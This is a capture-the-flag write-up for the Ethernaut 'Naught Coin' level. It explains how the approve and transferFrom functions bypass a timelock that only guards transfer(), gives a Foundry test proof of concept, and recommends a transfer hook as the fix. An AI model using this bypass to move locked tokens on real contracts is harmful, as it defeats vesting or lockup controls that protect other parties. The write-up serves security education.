# Level 15 - Naught Coin

## Objectives

- Transfer tokens to another address skipping the lockout period.

## Contract Overview

The `NaughtCoin` contract has a `transfer` function that overrides the `transfer` function of the ERC20 contract. It adds a modifier `lockTokens` that prevents the initial owner from transferring tokens until the `timeLock` has passed.

## Static analysis (slither)

Here are the logs from the slither:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/NaughtCoin_slither.png)

## Finding the weak spots

There are two important areas in this vulnerable contract: function `transfer()` and the modifier `lockTokens()`.

```solidity

  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  }
```

To transfer the tokens out of our account we could have used the `transfer()` function. However, as it uses a modifier that checks for the time lock period, this option is not possible.

There are two-ways to transfer tokens:

- we can use the `transfer()` function to directly transfer tokens to a recipient, but this can only be done by the `msg.sender`.
- we can use the `transferFrom()` function, which allows an external arbitrary sender (which may be the owner of the tokens themselves) to transfer tokens on behalf of the owner to a recipient. Before sending the tokens, the owner must `approve` the sender to manage that specific amount of tokens.

Therefore, if the initial owner has given approval for a third-party to transfer tokens on their behalf, the transferFrom() function could be used to circumvent the restriction imposed by the lockTokens modifier.

## Potential attack scenario (hypothesis)

An attacker create another account to transfer all of his tokens before the timelock period.

An attacker can transfer tokens by using the fact that the ERC20 `transferFrom` function is not `timeLock` protected.

## Plan of the attack

1. Attacker creates another account.
2. Attacker approves himself to manage the whole amount of tokens before calling `transferFrom`.
3. Attacker calls `transferFrom`.
4. Attacker gets his token balance in the `NaughtCoin` contract to 0 because of transferring all his tokens to another account.

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/15-NaughtCoin.t.sol))

```solidity
  emit log_named_address("Attacker's address: ", address(attacker));
        emit log_string("Starting the exploit...");

        uint attackerBalanceBefore = naughtCoinContract.balanceOf(attacker);

        emit log_string(
            "--------------------------------------------------------------------------"
        );
        emit log_named_uint("Balance before", attackerBalanceBefore);

        // 1. Attacker creates another account.
        address anotherAttackerAccount = makeNameForAddress(
            "anotherAttackerAccount"
        );
        emit log_named_uint(
            "Balance of another account before attack",
            naughtCoinContract.balanceOf(anotherAttackerAccount)
        );
        emit log_string(
            "--------------------------------------------------------------------------"
        );
        // 2. Attacker approves himself to manage the whole amount of tokens before calling `transferFrom`.
        naughtCoinContract.approve(attacker, attackerBalanceBefore);

        // 3. Attacker calls `transferFrom`.
        naughtCoinContract.transferFrom(
            attacker,
            anotherAttackerAccount,
            attackerBalanceBefore
        );

        uint attackerBalanceAfter = naughtCoinContract.balanceOf(attacker);

        // 4. Attacker gets his token balance in the `NaughtCoin` contract to 0 because of transferring all his tokens to another account.
        emit log_named_uint("Balance after", attackerBalanceAfter);

        emit log_named_uint(
            "Balance of another account after attack",
            naughtCoinContract.balanceOf(anotherAttackerAccount)
        );
        emit log_string(
            "--------------------------------------------------------------------------"
        );
        // Assert that the attacker has no more tokens
        assertEq(naughtCoinContract.balanceOf(attacker), 0);

        // // Assert that the secondary account received all the tokens
        assertEq(
            naughtCoinContract.balanceOf(anotherAttackerAccount),
            attackerBalanceBefore
        );
```

Here are the logs from the exploit contract:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/NaughtCoin.png)

## Recommendations

Instead of overriding the transfer function, we could have implemented a hook that the EIP-20 define, called `_beforeTokenTransfer`.

This hook is called when any kind of token transfer happen:

- `mint` (transfer from 0x address to the user)
- `burn` (transfer from the user to 0x address)
- `transfer`
- `transferFrom`
  By doing so, they would have prevented this exploit.

## References

- [Blog Aditya Dixit](https://blog.dixitaditya.com/series/ethernaut)
- [Blog Stermi](https://stermi.xyz/blog/ethernaut-challenge-15-solution-naught-coin)
- [D-Squared YT - Ethernaut CTF Series](https://www.youtube.com/watch?v=_ylKN2R_o-Y&list=PLiAoBT74VLnmRIPZGg4F36fH3BjQ5fLnz)
- [Smart Contract Programmer YT - Ethernaut](https://www.youtube.com/playlist?list=PLO5VPQH6OWdWh5ehvlkFX-H3gRObKvSL6)
- [Mastering Ethereum book](https://github.com/ethereumbook/ethereumbook)
- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)
